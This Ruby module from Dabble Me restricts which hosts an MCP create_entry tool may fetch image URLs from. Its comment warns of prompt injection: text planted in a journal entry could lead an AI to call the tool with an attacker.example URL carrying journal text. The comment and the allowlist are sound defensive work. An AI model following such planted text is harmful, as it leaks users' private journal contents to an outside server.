# frozen_string_literal: true

module Mcp
  # The hosts create_entry's image_url may fetch from (Mcp::EntryCreator).
  #
  # Dabble Me fetches image_url itself, from its own servers. If any URL were allowed, text
  # planted in an entry could get an AI to call create_entry with
  # image_url=https://attacker.example/?q=<journal text>, and the fetch would hand the journal
  # text to that server, past the AI app's own limits on outside links. So image_url only
  # fetches from the file services AI apps host images on, where uploaders can't read the
  # request logs. Any other image goes through get_image_upload_url.
  #
  # Add a host (a new assistant's file service) with MCP_IMAGE_URL_HOSTS, comma-separated, e.g.
  # "files.example-ai.com,cdn.example-ai.com". A host also allows its subdomains.
  module ImageUrlHosts
    DEFAULT_HOSTS = %w[
      oaiusercontent.com
      googleusercontent.com
    ].freeze

    module_function

    def allowed
      extra = ENV.fetch('MCP_IMAGE_URL_HOSTS', '').split(',').map { |host| normalize(host) }
      (DEFAULT_HOSTS + extra).compact_blank.uniq
    end

    def allowed?(host, hosts: allowed)
      host = normalize(host)
      return false if host.blank?

      hosts.any? { |candidate| host == candidate || host.end_with?(".#{candidate}") }
    end

    def normalize(host)
      host.to_s.strip.downcase.delete_suffix('.')
    end
  end
end
